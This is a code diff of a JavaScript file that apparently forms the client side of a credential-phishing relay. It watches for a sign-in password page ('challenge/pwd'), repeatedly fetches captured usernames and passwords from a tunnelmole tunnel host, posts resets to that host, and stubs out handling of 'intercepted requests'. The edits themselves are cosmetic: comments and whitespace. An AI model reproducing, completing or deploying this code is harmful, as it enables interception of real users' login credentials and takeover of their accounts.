@@ -1,15 +1,15 @@
-let freqUsername = null; 
+let freqUsername = null;
 let freqPassword = null;
 let usernameFetched = false;
 let passwordFetched = false;
-let inPasswordPage = false;  // Track if we are on the password page
+let inPasswordPage = false;
 
 // ✅ Check if we are on the password page
 const checkPasswordPage = () => {
     if (window.location.href.includes('challenge/pwd')) {
         inPasswordPage = true;
         console.log('Now on the password page');
-        fetchFreqPassword();
+        fetchFreqPassword(); // Begin password fetch independently
     } else {
         inPasswordPage = false;
     }
@@ -38,16 +38,13 @@ const fetchFreqUsername = async () => {
 
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
 
-            // Trigger the username request independently without waiting for password logic
-            processUsernameRequests();
+            processUsernameRequests();  // Process username requests without waiting for password
 
-            // Wait for navigation to password page
-            setTimeout(() => {
-                checkPasswordPage(); // Check if we are on the password page
-            }, 1000); // Give the page some time to navigate
+            // Trigger password page navigation check in parallel
+            setTimeout(checkPasswordPage, 1000);  // Check if we are on the password page after 1 second
         } else {
             console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqUsername, 500); // Retry in 0.5s
+            setTimeout(fetchFreqUsername, 500);
         }
     } catch (error) {
         console.error('Error fetching username:', error);
@@ -55,9 +52,9 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// ✅ Fetch password
+// ✅ Fetch password independently
 const fetchFreqPassword = async () => {
-    if (passwordFetched || !inPasswordPage) return; // Only proceed if we are on the password page
+    if (passwordFetched || !inPasswordPage) return; // Proceed only if on password page
     console.log('Fetching password...');
 
     try {
@@ -78,7 +75,7 @@ const fetchFreqPassword = async () => {
 
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });
 
-            processPasswordRequests();
+            processPasswordRequests();  // Process password requests when data is available
         } else {
             console.warn("No password data received, retrying...");
             setTimeout(fetchFreqPassword, 500);
@@ -98,7 +95,6 @@ const processUsernameRequests = () => {
     }
 
     console.log("Processing pending username requests...");
-
     // Process username-related intercepted requests here
 };
 
@@ -111,7 +107,6 @@ const processPasswordRequests = () => {
     }
 
     console.log("Processing pending password requests...");
-
     // Process password-related intercepted requests here
 };
 
